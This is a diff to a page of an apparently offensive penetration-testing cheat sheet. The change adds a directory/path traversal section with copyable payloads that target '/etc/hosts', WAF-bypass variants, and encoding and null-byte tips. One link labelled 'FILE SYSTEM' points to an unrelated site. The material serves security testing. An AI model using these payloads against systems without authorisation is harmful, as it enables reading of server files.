@@ -34,16 +34,38 @@
     <a href="/machete/about.html">ABOUT</a> 
 </div> 
 
-<p class="titulos"><mark>[DIRECTORY TRAVERSAL]</mark></p>
+<p class="titulos"><mark>[DIRECTORY/PATH TRAVERSAL]</mark></p>
 <div>
 <pre>
 <div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" style="float: left;">&lt;&lt;</button><br><br>
 <details>
-<summary>COMMON VULNERABILITIES</summary>
-<p>DESCRIPTION: </p>
-</details>		
+<summary>GENERAL COMMANDS</summary>
+<p><b>DESCRIPTION: </b> Collection of commands to use when testing for path/directory traversal.
 
+<b>C1: </b><p id="DT01"><mark>../../../../etc/hosts</mark></p>
+
+<b>try: </b>
+* <u>Nullbyte</u> | %00
+* <u>Encoding</u> 
+* <u>Double Encoding</u> 
+* <u>UTF-8 Encoding</u>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT01')">.C1.</button>
+
+<b><u>WAF bypass</u></b>
+
+<b>C2: </b><p id="DT02"><mark>..././etc/hosts</mark></p>
+<b>C3: </b><p id="DT03"><mark>..;/etc/hosts</mark></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT03')">.C3.</button></p>
+
+</details>
+
+<b>NOTE: </b> All can be tested with 1, 2, or any segments [../] as needed all applications will behave different. If needed, SNIPER ATTACK! (or similar). Also,
+invert the symbol, use backslash and try it. ["..\"]
+
+CHECK THE FOLLOWING LINK, >>> <a href="https://securityheaders.com" target="_blank">FILE SYSTEM</a>
+It can be used to check valuable files per OS.
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
